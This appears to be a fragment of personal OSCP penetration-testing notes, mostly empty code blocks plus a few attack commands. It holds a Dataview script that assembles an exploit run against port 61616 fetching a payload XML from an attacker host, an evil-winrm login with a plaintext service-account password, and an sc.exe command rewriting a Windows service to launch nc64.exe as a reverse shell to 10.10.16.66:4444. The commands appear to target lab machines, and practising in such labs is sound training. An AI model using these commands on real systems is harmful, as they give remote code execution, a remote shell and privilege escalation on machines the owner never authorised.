```
Synced OSCP Notes/Top/Active Notes
```

```
const page = dv.page("Synced OSCP Notes/Top/Active Notes");const ip = page?.IP ?? "NO IP FOUND";
const discoveredDomain = page?.["Discovered Web Domain"] ?? "NO DOMAIN FOUND";

const command = `go run main.go -i ${ip} -p 61616 -u http://${KaliIP}:4444/poc-linux.xml`;

dv.paragraph("```bash\n" + command + "\n```");
```

```
```dataviewjs
const page = dv.page("Synced OSCP Notes/Top/Active Notes");
const discoveredDomain = page?.["Discovered Web Domain"] ?? "NO DOMAIN FOUND";

const command = `${discoveredDomain}`;

dv.paragraph("```bash\n" + command + "\n```");
```

```
evil-winrm -i 10.129.95.241 -u svc-printer -p 1edFg43012!!
```

```
sc.exe config vss binPath="C:\Users\svc-printer\Desktop\nc64.exe -e cmd.exe 10.10.16.66 4444"
```

```

```

```

```

```

```

```

```

```

```

```

```

```

```

```

```

```

```

```

```

```

```

```

```

```

```

```

```

```

```

```

```

```

```

```

```

```

```

```

```

```

```

```

```

```

```

```

```

```

```

```

```

```

```

```

```

```

```

```

```

```

```

```

```

```

```

```

```

```

```

```

```

```

```

```

```

```

```

```

```

```

```

```

```

```

```

```

```

```

```

```

```

```

```

```

```

```

```

```

```

```

```

```

```

```

```

```

```

```

```

```